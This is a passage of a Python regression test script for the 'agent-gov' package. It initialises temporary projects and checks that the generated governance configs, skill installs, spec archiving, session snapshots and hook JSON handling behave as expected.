#!/usr/bin/env python3
"""Package-level regression checks for agent-gov."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


PACKAGE_ROOT = Path(__file__).resolve().parents[2]
INIT_SCRIPT = PACKAGE_ROOT / ".codex" / "skills" / "agent-gov" / "scripts" / "init_agent_project.py"
NPM_BIN = PACKAGE_ROOT / "npm" / "bin" / "agent-gov.mjs"


def run(cmd: list[str], cwd: Path, expect_ok: bool = True, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    result = subprocess.run(cmd, cwd=cwd, text=True, capture_output=True, check=False, env=env)
    if expect_ok and result.returncode != 0:
        print("command failed:", " ".join(cmd), file=sys.stderr)
        print(result.stdout, file=sys.stderr)
        print(result.stderr, file=sys.stderr)
        raise SystemExit(result.returncode)
    if not expect_ok and result.returncode == 0:
        print("command unexpectedly passed:", " ".join(cmd), file=sys.stderr)
        print(result.stdout, file=sys.stderr)
        print(result.stderr, file=sys.stderr)
        raise SystemExit(1)
    return result


def assert_no_missing_doc_refs(target: Path) -> None:
    token_candidates = {
        ".agent/workflow.json": [target / ".agent" / "workflow.json"],
        ".agent/workflow-profiles.json": [target / ".agent" / "workflow-profiles.json"],
        ".agent/task-board.json": [target / ".agent" / "task-board.json"],
        ".agent/risk-zones.json": [target / ".agent" / "risk-zones.json"],
        ".agent/review-policy.json": [target / ".agent" / "review-policy.json"],
        ".agent/worktrees.json": [target / ".agent" / "worktrees.json"],
        ".agent/subagents.json": [target / ".agent" / "subagents.json"],
        ".agent/hooks.json": [target / ".agent" / "hooks.json"],
        ".agent/knowledge.json": [target / ".agent" / "knowledge.json"],
        ".agent/memory.json": [target / ".agent" / "memory.json"],
        ".agent/context.json": [target / ".agent" / "context.json"],
        ".agent/dev-map.json": [target / ".agent" / "dev-map.json"],
        ".agent/skill-hygiene.json": [target / ".agent" / "skill-hygiene.json"],
        ".agent/capabilities.json": [target / ".agent" / "capabilities.json"],
        ".agent/tooling.json": [target / ".agent" / "tooling.json"],
        ".agent/security.json": [target / ".agent" / "security.json"],
        ".agent/mechanical-checks.json": [target / ".agent" / "mechanical-checks.json"],
        ".agent/baselines.json": [target / ".agent" / "baselines.json"],
        ".agent/harness-evolution.json": [target / ".agent" / "harness-evolution.json"],
        ".agent/mcp-policy.json": [target / ".agent" / "mcp-policy.json"],
        ".agent/governance-gc.json": [target / ".agent" / "governance-gc.json"],
        ".agent/skill-distribution.json": [target / ".agent" / "skill-distribution.json"],
        "docs/DEV_MAP.md": [target / "docs" / "DEV_MAP.md"],
        "docs/AI_CODING_GLOSSARY.md": [target / "docs" / "AI_CODING_GLOSSARY.md"],
        "docs/DOMAIN_GLOSSARY.md": [target / "docs" / "DOMAIN_GLOSSARY.md"],
        "agent_memory.py": [target / ".agent" / "tools" / "agent_memory.py"],
        "agent_context.py": [target / ".agent" / "tools" / "agent_context.py"],
        "agent_capabilities.py": [target / "scripts" / "agent_capabilities.py"],
        "agent_skill_hygiene.py": [target / "scripts" / "agent_skill_hygiene.py"],
        "agent_tooling.py": [target / "scripts" / "agent_tooling.py"],
        "agent_security.py": [target / "scripts" / "agent_security.py"],
        "agent_task.py": [target / "scripts" / "agent_task.py"],
        "agent_verify.py": [target / "scripts" / "agent_verify.py"],
        "agent_gc.py": [target / "scripts" / "agent_gc.py"],
        "agent_sync_skills.py": [target / "scripts" / "agent_sync_skills.py"],
    }
    docs = [target / "AGENTS.md", target / "docs" / "index.md", target / "docs" / "QUALITY.md"]
    for doc in docs:
        if not doc.exists():
            continue
        text = doc.read_text(encoding="utf-8")
        for token, candidates in token_candidates.items():
            if token in text and not any(candidate.exists() for candidate in candidates):
                print(f"{doc.relative_to(target)} references missing profile path: {token}", file=sys.stderr)
                raise SystemExit(1)


def assert_install_skill_scope(temp_root: Path) -> None:
    project = temp_root / "install-scope-project"
    project.mkdir(parents=True, exist_ok=True)
    codex_home = temp_root / "codex-home"
    env = dict(os.environ)
    env["CODEX_HOME"] = str(codex_home)

    project_install = run(["node", str(NPM_BIN), "install-skill", str(project)], cwd=PACKAGE_ROOT, env=env)
    if "skill scope: project" not in project_install.stdout:
        print("install-skill did not report project scope by default", file=sys.stderr)
        print(project_install.stdout + project_install.stderr, file=sys.stderr)
        raise SystemExit(1)
    if not (project / ".codex" / "skills" / "agent-gov" / "SKILL.md").exists():
        print("default install-skill did not install into project .codex/skills", file=sys.stderr)
        raise SystemExit(1)
    if (codex_home / "skills" / "agent-gov" / "SKILL.md").exists():
        print("default install-skill unexpectedly wrote to global CODEX_HOME", file=sys.stderr)
        raise SystemExit(1)

    global_install = run(["node", str(NPM_BIN), "install-skill", "--global", "--force"], cwd=PACKAGE_ROOT, env=env)
    if "skill scope: global" not in global_install.stdout:
        print("install-skill --global did not report global scope", file=sys.stderr)
        print(global_install.stdout + global_install.stderr, file=sys.stderr)
        raise SystemExit(1)
    if not (codex_home / "skills" / "agent-gov" / "SKILL.md").exists():
        print("install-skill --global did not install into CODEX_HOME/skills", file=sys.stderr)
        raise SystemExit(1)


def assert_doctor_requires_target_skill(temp_root: Path) -> None:
    project = temp_root / "doctor-target-skill"
    project.mkdir(parents=True, exist_ok=True)

    missing = run(["node", str(NPM_BIN), "doctor", str(project)], cwd=PACKAGE_ROOT, expect_ok=False)
    missing_output = missing.stdout + missing.stderr
    if "missing - target agent-gov skill" not in missing_output:
        print("doctor did not report the missing target agent-gov skill", file=sys.stderr)
        print(missing_output, file=sys.stderr)
        raise SystemExit(1)

    run(["node", str(NPM_BIN), "install-skill", str(project)], cwd=PACKAGE_ROOT)
    installed = run(["node", str(NPM_BIN), "doctor", str(project)], cwd=PACKAGE_ROOT)
    installed_output = installed.stdout + installed.stderr
    if "ok - target agent-gov skill" not in installed_output:
        print("doctor did not report the installed target agent-gov skill", file=sys.stderr)
        print(installed_output, file=sys.stderr)
        raise SystemExit(1)


def assert_blank_project_default_profile(temp_root: Path) -> None:
    blank = temp_root / "blank-default-full"
    blank.mkdir(parents=True, exist_ok=True)
    run(["node", str(NPM_BIN), "init", str(blank), "--layout", "minimal", "--remote-kind", "local"], cwd=PACKAGE_ROOT)
    blank_config = json.loads((blank / ".agent" / "config.json").read_text(encoding="utf-8"))
    if blank_config.get("governance_profile") != "full":
        print("blank project did not default to full governance profile", file=sys.stderr)
        print(json.dumps(blank_config, indent=2), file=sys.stderr)
        raise SystemExit(1)
    for relative in (".agent/subagents.json", ".agent/hooks.json", ".agent/tooling.json", ".codex/config.toml", "scripts/agent_tooling.py"):
        if not (blank / relative).exists():
            print(f"blank project full default did not create full-profile artifact: {relative}", file=sys.stderr)
            raise SystemExit(1)

    existing = temp_root / "existing-default-standard"
    existing.mkdir(parents=True, exist_ok=True)
    (existing / "README.md").write_text("# Existing Project\n", encoding="utf-8")
    run(["node", str(NPM_BIN), "init", str(existing), "--layout", "minimal", "--remote-kind", "local"], cwd=PACKAGE_ROOT)
    existing_config = json.loads((existing / ".agent" / "config.json").read_text(encoding="utf-8"))
    if existing_config.get("governance_profile") != "standard":
        print("existing project did not default to standard governance profile", file=sys.stderr)
        print(json.dumps(existing_config, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if (existing / ".agent" / "subagents.json").exists():
        print("existing project standard default unexpectedly created full-profile subagent config", file=sys.stderr)
        raise SystemExit(1)

    explicit = temp_root / "blank-explicit-standard"
    explicit.mkdir(parents=True, exist_ok=True)
    run(
        [
            "node",
            str(NPM_BIN),
            "init",
            str(explicit),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    explicit_config = json.loads((explicit / ".agent" / "config.json").read_text(encoding="utf-8"))
    if explicit_config.get("governance_profile") != "standard":
        print("explicit standard profile was not respected for a blank project", file=sys.stderr)
        print(json.dumps(explicit_config, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if (explicit / ".agent" / "subagents.json").exists():
        print("explicit standard profile unexpectedly created full-profile subagent config", file=sys.stderr)
        raise SystemExit(1)


def assert_workflow_stage_closure(target: Path) -> None:
    workflow_path = target / ".agent" / "workflow.json"
    profiles_path = target / ".agent" / "workflow-profiles.json"
    if not workflow_path.exists() or not profiles_path.exists():
        return
    workflow = json.loads(workflow_path.read_text(encoding="utf-8"))
    profiles = json.loads(profiles_path.read_text(encoding="utf-8"))
    config_path = target / ".agent" / "config.json"
    config = json.loads(config_path.read_text(encoding="utf-8")) if config_path.exists() else {}
    governance_profile = config.get("governance_profile", "standard")
    workflow_stages = set(workflow.get("stages", []))
    gates = workflow.get("gates", {})
    goal_refinement = gates.get("goal_refinement", {})
    technology_stack = gates.get("technology_stack_intake", {})
    task_decomposition = gates.get("task_decomposition", {})
    stage_loop = gates.get("stage_review_loop", {})
    review_fix = gates.get("review_fix_gate", {})
    completion = gates.get("completion_verification", {})
    for stage in ("goal_refinement", "task_decomposition"):
        if stage not in workflow_stages or stage not in workflow.get("stage_definitions", {}):
            print(f"workflow is missing autonomous stage: {stage}", file=sys.stderr)
            raise SystemExit(1)
    if goal_refinement.get("preserve_raw_user_goal") is not True or goal_refinement.get("write_refined_goal_before_durable_goal") is not True:
        print("goal_refinement gate does not preserve and refine user goals", file=sys.stderr)
        raise SystemExit(1)
    if set(goal_refinement.get("required_for_profiles", [])) != {"bugfix", "standard", "full"}:
        print("goal_refinement gate does not apply to bugfix/standard/full profiles", file=sys.stderr)
        raise SystemExit(1)
    for key in ("ask_one_question_at_a_time", "provide_recommended_answer_and_reason", "do_not_rely_on_transient_chat"):
        if technology_stack.get(key) is not True:
            print(f"technology_stack_intake does not enforce {key}", file=sys.stderr)
            raise SystemExit(1)
    if set(task_decomposition.get("required_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
        print("task_decomposition gate does not apply to all profiles", file=sys.stderr)
        raise SystemExit(1)
    if set(stage_loop.get("required_for_profiles", [])) != {"standard", "full"}:
        print("stage_review_loop does not apply to standard/full profiles", file=sys.stderr)
        raise SystemExit(1)
    if stage_loop.get("loop") != ["review", "fix", "re_review"]:
        print("stage_review_loop does not require review-fix-re_review", file=sys.stderr)
        raise SystemExit(1)
    if review_fix.get("applies_to_stage_review_loop") is not True:
        print("review_fix_gate is not tied to stage review loops", file=sys.stderr)
        raise SystemExit(1)
    if completion.get("completed_spec_changes_must_be_archived") is not True:
        print("completion gate does not require completed spec changes to be archived", file=sys.stderr)
        raise SystemExit(1)
    if set(completion.get("review_fix_gate_required_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
        print("completion gate does not require review-fix for all profiles", file=sys.stderr)
        raise SystemExit(1)
    task_board_path = target / ".agent" / "task-board.json"
    if task_board_path.exists():
        task_board = json.loads(task_board_path.read_text(encoding="utf-8"))
        policy = task_board.get("policy", {})
        if set(policy.get("done_requires_review_gate_pass_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
            print("task board does not require done review gates for all profiles", file=sys.stderr)
            raise SystemExit(1)
        if set(policy.get("goal_contract_required_for_profiles", [])) != {"bugfix", "standard", "full"}:
            print("task board does not require goal contracts for bugfix/standard/full", file=sys.stderr)
            raise SystemExit(1)
        if set(policy.get("goal_contract_required_states", [])) != {"active", "review", "done"}:
            print("task board does not require goal contracts through done", file=sys.stderr)
            raise SystemExit(1)
        if not {"plan", "implementation", "verification", "handoff"}.issubset(set(policy.get("goal_contract_required_before_stages", []))):
            print("task board does not require goal contracts before protected implementation stages", file=sys.stderr)
            raise SystemExit(1)
        if set(policy.get("task_decomposition_required_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
            print("task board does not require task decomposition for all profiles", file=sys.stderr)
            raise SystemExit(1)
    if governance_profile in {"standard", "full"}:
        for relative in (".agent/intake/.gitkeep", ".agent/templates/intake-packet.md.tmpl"):
            if not (target / relative).exists():
                print(f"autonomous intake path was not generated: {relative}", file=sys.stderr)
                raise SystemExit(1)
    for name, profile in profiles.get("profiles", {}).items():
        if profile.get("review_gate_required") is not True:
            print(f"workflow profile {name} does not require a review gate", file=sys.stderr)
            raise SystemExit(1)
        for stage in ("goal_refinement", "task_decomposition"):
            if stage not in profile.get("stages", []):
                print(f"workflow profile {name} does not include {stage}", file=sys.stderr)
                raise SystemExit(1)
        for stage in profile.get("stages", []):
            if stage not in workflow_stages:
                print(f"workflow profile {name} references unknown stage: {stage}", file=sys.stderr)
                raise SystemExit(1)


def assert_global_skill_governance(target: Path, python: str, temp_root: Path) -> None:
    global_root = temp_root / "global-skill-root"
    global_skill = global_root / "skills" / "global-only-skill"
    global_skill.mkdir(parents=True, exist_ok=True)
    (global_skill / "SKILL.md").write_text(
        """---
name: global-only-skill
description: Regression fixture for unmanaged global skill governance.
---

# Global Only Skill
""",
        encoding="utf-8",
    )
    hygiene_path = target / ".agent" / "skill-hygiene.json"
    hygiene = json.loads(hygiene_path.read_text(encoding="utf-8"))
    hygiene["scan_roots"] = [".codex/skills", str(global_root / "skills")]
    hygiene_path.write_text(json.dumps(hygiene, indent=2) + "\n", encoding="utf-8")

    report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
    records = {item.get("name"): item for item in report.get("skills", [])}
    global_record = records.get("global-only-skill")
    if not global_record or global_record.get("scope") != "global" or global_record.get("global_discovered") is not True:
        print("project skill report did not include unmanaged global skill discovery", file=sys.stderr)
        print(json.dumps(report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    doctor = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target, expect_ok=False)
    if "global_unmanaged" not in (doctor.stdout + doctor.stderr):
        print("project skill doctor did not fail unmanaged global skill", file=sys.stderr)
        print(doctor.stdout + doctor.stderr, file=sys.stderr)
        raise SystemExit(1)

    shutil.rmtree(global_skill)

    project_skill = target / ".codex" / "skills" / "agent-gov"
    project_skill.mkdir(parents=True, exist_ok=True)
    (project_skill / "SKILL.md").write_text(
        """---
name: agent-gov
description: Regression fixture for project-governed agent-gov skill.
---

# Agent Gov
""",
        encoding="utf-8",
    )
    global_same_name = global_root / "skills" / "agent-gov"
    global_same_name.mkdir(parents=True, exist_ok=True)
    (global_same_name / "SKILL.md").write_text(
        """---
name: agent-gov
description: Regression fixture for same-name unmanaged global skill governance.
---

# Agent Gov Global
""",
        encoding="utf-8",
    )
    project_skills_path = target / ".agent" / "project-skills.json"
    project_skills = json.loads(project_skills_path.read_text(encoding="utf-8"))
    project_skills["skills"]["agent-gov"] = {
        "scope": "project",
        "host": "codex",
        "path": ".codex/skills/agent-gov",
        "lifecycle": "active",
        "intent": "workspace-only",
        "owner": "regression",
        "risk": "medium",
        "source": {"kind": "repo-local", "repository": "", "ref": "", "pinned": False},
        "content": {},
        "release": {"manifest": "", "publishable": False, "release_gate": "local-validation"},
        "review": {"requires_review": False, "latest_status": "not-required", "latest_artifact": ""},
    }
    project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")

    same_name_report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
    same_name_records = {item.get("name"): item for item in same_name_report.get("skills", [])}
    same_name_record = same_name_records.get("agent-gov")
    if not same_name_record or same_name_record.get("global_discovered") is not True:
        print("project skill report did not surface same-name global discovery", file=sys.stderr)
        print(json.dumps(same_name_report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    same_name_doctor = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target, expect_ok=False)
    if "global_unmanaged" not in (same_name_doctor.stdout + same_name_doctor.stderr):
        print("project skill doctor did not fail same-name unmanaged global skill", file=sys.stderr)
        print(same_name_doctor.stdout + same_name_doctor.stderr, file=sys.stderr)
        raise SystemExit(1)

    project_skills["skills"]["agent-gov"]["global_install_path"] = str(global_same_name)
    project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")
    governed_report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
    governed_records = {item.get("name"): item for item in governed_report.get("skills", [])}
    governed_agent_gov = governed_records.get("agent-gov", {})
    if "global_unmanaged" in governed_agent_gov.get("statuses", []):
        print("registered same-name global skill still reported as unmanaged", file=sys.stderr)
        print(json.dumps(governed_agent_gov, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target)


def assert_spec_archive_gate(target: Path, python: str) -> None:
    run(
        [
            python,
            "scripts/agent_spec.py",
            "new-change",
            "archive-gate",
            "--summary",
            "Verify completed active changes are archived.",
            "--profile",
            "tiny",
        ],
        cwd=target,
    )
    change = target / "openspec" / "changes" / "archive-gate"
    (change / "proposal.md").write_text(
        """# Proposal: archive-gate

## Summary

Verify completed active changes cannot pass doctor.

## Goals

- Catch completed active changes.

## Non-Goals

- Change production application behavior.

## User Impact

- Agents get a hard reminder to archive completed specs.
""",
        encoding="utf-8",
    )
    (change / "design.md").write_text(
        """# Design: archive-gate

## Approach

- Use the generated spec doctor as the release gate.

## Architecture Notes

- Keep archive policy in repo-local scripts.

## Risks

- False positives are limited to completed active changes.

## Validation Strategy

- Doctor fails before archive and passes after archive.
""",
        encoding="utf-8",
    )
    (change / "tasks.md").write_text(
        """# Tasks: archive-gate

## Validation

- [x] Verify spec archive gate catches completed active changes.
""",
        encoding="utf-8",
    )
    status = json.loads(run([python, "scripts/agent_spec.py", "status", "--change", "archive-gate", "--json"], cwd=target).stdout)
    if status.get("state") != "all_done":
        print("archive-gate fixture did not reach all_done", file=sys.stderr)
        print(json.dumps(status, indent=2), file=sys.stderr)
        raise SystemExit(1)
    doctor = run([python, "scripts/agent_spec.py", "doctor"], cwd=target, expect_ok=False)
    doctor_text = doctor.stdout + doctor.stderr
    if "complete but still active" not in doctor_text or "archive archive-gate" not in doctor_text:
        print("agent_spec.py doctor did not reject a completed active change", file=sys.stderr)
        print(doctor_text, file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_spec.py", "archive", "archive-gate"], cwd=target)
    if change.exists():
        print("archive-gate active change still exists after archive", file=sys.stderr)
        raise SystemExit(1)
    if not list((target / "openspec" / "changes" / "archive").glob("*-archive-gate")):
        print("archive-gate was not moved into openspec/changes/archive", file=sys.stderr)
        raise SystemExit(1)
    archived_status = json.loads(run([python, "scripts/agent_spec.py", "status", "--change", "archive-gate", "--json"], cwd=target).stdout)
    if archived_status.get("change", {}).get("status") != "archived":
        print("agent_spec.py status did not resolve the archived change", file=sys.stderr)
        print(json.dumps(archived_status, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run(
        [
            python,
            "scripts/agent_spec.py",
            "new-change",
            "archive-gate",
            "--summary",
            "Ambiguous archive fixture.",
            "--profile",
            "tiny",
        ],
        cwd=target,
    )
    ambiguous = run([python, "scripts/agent_spec.py", "status", "--change", "archive-gate", "--json"], cwd=target, expect_ok=False)
    if "ambiguous change reference" not in (ambiguous.stdout + ambiguous.stderr):
        print("agent_spec.py status did not reject active/archive ambiguity", file=sys.stderr)
        print(ambiguous.stdout + ambiguous.stderr, file=sys.stderr)
        raise SystemExit(1)
    shutil.rmtree(change)
    run([python, "scripts/agent_spec.py", "doctor"], cwd=target)


def assert_project_review_templates_are_profile_safe(target: Path) -> None:
    for relative in (".agent/templates/project-review.md.tmpl", ".agent/templates/project-fix-log.md.tmpl"):
        path = target / relative
        if not path.exists():
            continue
        guarded_tools: set[str] = set()
        for line in path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if stripped.startswith("if [ -f ") and stripped.endswith(" ]; then"):
                guarded = stripped.removeprefix("if [ -f ").removesuffix(" ]; then").strip("\"'")
                if guarded:
                    guarded_tools.add(guarded)
                continue
            if not stripped.startswith("python3 "):
                continue
            parts = stripped.split()
            if len(parts) < 2 or not parts[1].endswith(".py"):
                continue
            if parts[1] in guarded_tools:
                continue
            tool = target / parts[1]
            if not tool.exists():
                print(f"{relative} directly invokes profile-missing tool: {parts[1]}", file=sys.stderr)
                raise SystemExit(1)


def assert_core_session_resume_is_profile_aware(target: Path, python: str) -> None:
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "core-smoke",
            "--goal",
            "Core session smoke",
        ],
        cwd=target,
    )
    index = json.loads((target / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    session_id = index.get("active_session")
    if not session_id:
        print("core session did not record an active session", file=sys.stderr)
        raise SystemExit(1)
    events_path = target / ".agent" / "sessions" / "events.jsonl"
    events = [json.loads(line) for line in events_path.read_text(encoding="utf-8").splitlines() if line.strip()]
    if not events or events[-1].get("schema") != "agent-session-event-v1":
        print("core session did not record append-only session events", file=sys.stderr)
        raise SystemExit(1)
    text = "\n".join(
        [
            (target / ".agent" / "sessions" / session_id / "resume-prompt.md").read_text(encoding="utf-8"),
            (target / ".agent" / "sessions" / session_id / "bootstrap.md").read_text(encoding="utf-8"),
            (target / ".agent" / "sessions" / "bootstrap.md").read_text(encoding="utf-8"),
        ]
    )
    forbidden = [".agent/workflow.json", ".agent/worktrees.json", "agent_context.py", "subagent snapshots"]
    for token in forbidden:
        if token in text:
            print(f"core session resume artifacts reference profile-missing token: {token}", file=sys.stderr)
            raise SystemExit(1)


def assert_session_doctor_handles_long_git_status(temp_root: Path, python: str) -> None:
    target = temp_root / "long-git-status-session"
    target.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(target),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "core",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(["git", "init"], cwd=target)
    for index in range(95):
        (target / f"dirty-status-{index:03d}.txt").write_text(f"dirty {index}\n", encoding="utf-8")
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "long-status",
            "--goal",
            "Long git status smoke",
        ],
        cwd=target,
    )
    doctor = run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target)
    doctor_text = doctor.stdout + doctor.stderr
    if "worktree has changes not reflected" in doctor_text:
        print("session doctor produced a false dirty-tree warning for a long git status", file=sys.stderr)
        print(doctor_text, file=sys.stderr)
        raise SystemExit(1)
    index_data = json.loads((target / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    session_id = index_data.get("active_session")
    if not session_id:
        print("long git status smoke did not create an active session", file=sys.stderr)
        raise SystemExit(1)
    snapshot_path = target / ".agent" / "sessions" / session_id / "refs" / "git-status-short.txt"
    snapshot_text = snapshot_path.read_text(encoding="utf-8")
    current_status = run(["git", "status", "--short"], cwd=target).stdout
    if snapshot_text.rstrip("\n") != current_status.rstrip("\n"):
        print("session git status snapshot does not match current git status", file=sys.stderr)
        print(snapshot_path, file=sys.stderr)
        raise SystemExit(1)
    bootstrap_text = (target / ".agent" / "sessions" / session_id / "bootstrap.md").read_text(encoding="utf-8")
    if "refs/git-status-short.txt" not in bootstrap_text:
        print("bootstrap.md does not point to the full git status snapshot", file=sys.stderr)
        raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "compact", "--summary", "Long status compact"], cwd=target)
    changes_text = (target / ".agent" / "sessions" / session_id / "changes.md").read_text(encoding="utf-8")
    if "refs/git-status-short.txt" not in changes_text:
        print("changes.md does not point to the full git status snapshot", file=sys.stderr)
        raise SystemExit(1)

    tracked = temp_root / "tracked-session-status"
    tracked.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(tracked),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "core",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(["git", "init"], cwd=tracked)
    run(["git", "config", "user.email", "review@example.com"], cwd=tracked)
    run(["git", "config", "user.name", "Review"], cwd=tracked)
    run(["git", "add", "."], cwd=tracked)
    run(["git", "commit", "-m", "init"], cwd=tracked)
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "tracked-status",
            "--goal",
            "Tracked status smoke",
        ],
        cwd=tracked,
    )
    run(["git", "add", "."], cwd=tracked)
    run(["git", "commit", "-m", "session"], cwd=tracked)
    run([python, ".agent/tools/agent_session.py", "doctor"], cwd=tracked)
    tracked_index = json.loads((tracked / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    tracked_session_id = tracked_index.get("active_session")
    tracked_snapshot = tracked / ".agent" / "sessions" / tracked_session_id / "refs" / "git-status-short.txt"
    tracked_status = run(["git", "status", "--short"], cwd=tracked).stdout
    if tracked_snapshot.read_text(encoding="utf-8").rstrip("\n") != tracked_status.rstrip("\n"):
        print("tracked session git status snapshot became stale after doctor/bootstrap writes", file=sys.stderr)
        print(tracked_snapshot, file=sys.stderr)
        raise SystemExit(1)


def assert_native_hook_json_contract(target: Path, python: str) -> None:
    hook_path = target / ".agent" / "tools" / "governance_hook.py"
    if not hook_path.exists():
        print("governance hook script was not generated", file=sys.stderr)
        raise SystemExit(1)

    codex_hooks_path = target / ".codex" / "hooks.json"
    hooks = json.loads(codex_hooks_path.read_text(encoding="utf-8"))
    session_hooks = hooks.get("hooks", {}).get("SessionStart", [])
    commands = [
        item.get("command", "")
        for block in session_hooks
        for item in block.get("hooks", [])
        if isinstance(item, dict)
    ]
    if not commands or not all("--json-output" in command for command in commands):
        print("generated Codex hooks do not request JSON hook output", file=sys.stderr)
        print(json.dumps(hooks, indent=2), file=sys.stderr)
        raise SystemExit(1)

    stop = subprocess.run(
        [python, str(hook_path), "--event", "stop", "--json-output", "--strict-json-input"],
        cwd=target,
        text=True,
        input="\ufeff{\"additionalContext\":\"\"}",
        capture_output=True,
        check=False,
    )
    if stop.returncode != 0:
        print("JSON hook stop command failed with BOM stdin", file=sys.stderr)
        print(stop.stdout, file=sys.stderr)
        print(stop.stderr, file=sys.stderr)
        raise SystemExit(stop.returncode)
    stop_payload = json.loads(stop.stdout)
    if stop_payload.get("additionalContext") != "":
        print("JSON hook did not preserve empty additionalContext", file=sys.stderr)
        print(stop.stdout, file=sys.stderr)
        raise SystemExit(1)
    if stop_payload.get("hookSpecificOutput", {}).get("additionalContext") != "":
        print("JSON hook hookSpecificOutput did not preserve empty additionalContext", file=sys.stderr)
        print(stop.stdout, file=sys.stderr)
        raise SystemExit(1)

    invalid = subprocess.run(
        [python, str(hook_path), "--event", "stop", "--json-output", "--strict-json-input"],
        cwd=target,
        text=True,
        input="{invalid",
        capture_output=True,
        check=False,
    )
    if invalid.returncode == 0:
        print("strict JSON hook input unexpectedly passed", file=sys.stderr)
        print(invalid.stdout, file=sys.stderr)
        raise SystemExit(1)
    invalid_payload = json.loads(invalid.stdout)
    if invalid_payload.get("status") != "error":
        print("strict JSON hook failure did not emit JSON error status", file=sys.stderr)
        print(invalid.stdout, file=sys.stderr)
        raise SystemExit(1)


def assert_existing_project_adoption(init_script: Path, temp_root: Path, python: str) -> None:
    conflicted = temp_root / "adoption-conflict"
    conflicted.mkdir(parents=True, exist_ok=True)
    custom_agents = "custom existing agent instructions\n"
    (conflicted / "AGENTS.md").write_text(custom_agents, encoding="utf-8")
    dry_run = run(
        [
            python,
            str(init_script),
            str(conflicted),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--dry-run",
        ],
        cwd=PACKAGE_ROOT,
    )
    dry_output = dry_run.stdout + dry_run.stderr
    for token in ("mode: dry-run", "would create:", "conflicts:", "AGENTS.md"):
        if token not in dry_output:
            print(f"dry-run adoption report missing {token!r}", file=sys.stderr)
            print(dry_output, file=sys.stderr)
            raise SystemExit(1)
    if (conflicted / "AGENTS.md").read_text(encoding="utf-8") != custom_agents:
        print("dry-run adoption modified an existing AGENTS.md", file=sys.stderr)
        raise SystemExit(1)

    stable = temp_root / "adoption-idempotent"
    stable.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(stable),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    rerun = run(
        [
            python,
            str(init_script),
            str(stable),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
            "--dry-run",
        ],
        cwd=PACKAGE_ROOT,
    )
    rerun_output = rerun.stdout + rerun.stderr
    if "unchanged:" not in rerun_output or "preserved append-only:" not in rerun_output or "conflicts:" in rerun_output:
        print("idempotent dry run did not report stable unchanged/preserved state", file=sys.stderr)
        print(rerun_output, file=sys.stderr)
        raise SystemExit(1)


def assert_task_board_guards(init_script: Path, temp_root: Path, python: str) -> None:
    goal_args = [
        "--goal-raw",
        "User asked to guard task-board completion.",
        "--goal-refined",
        "Verify task-board completion gates reject missing review evidence after goal and decomposition evidence are present.",
        "--goal-refinement-rationale",
        "Regression fixture rewrites the raw request into a verifiable completion-gate goal.",
        "--goal-confirmation-status",
        "agent_assumed",
        "--goal-objective",
        "Verify task-board completion gates.",
        "--goal-outcome",
        "Task-board guards reject incomplete completion evidence.",
        "--goal-decision-summary",
        "Use deterministic local fixtures to verify task-board completion gates.",
        "--goal-spec-change",
        "regression-fixture",
        "--goal-non-goal",
        "Do not change application behavior.",
        "--goal-constraint",
        "Keep the regression fixture local and deterministic.",
        "--goal-success-evidence",
        "agent_task.py, agent_check.py, agent_verify.py, and agent_score.py all detect invalid completion states.",
        "--goal-stop-condition",
        "Stop when completion gates fail to reject an invalid fixture.",
    ]
    decomposition_args = [
        "--decomposition-status",
        "complete",
        "--decomposition-summary",
        "Create a task, satisfy requirements, then verify completion gates.",
        "--decomposition-next-task",
        "Run generated doctors and hard checks.",
        "--decomposition-evidence-path",
        "docs/features/guard-task/04_DEVELOPMENT.md",
        "--decomposition-subtask",
        "Create guard task",
        "--decomposition-subtask",
        "Verify completion gate rejection",
    ]
    guarded = temp_root / "task-board-guards"
    guarded.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(guarded),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
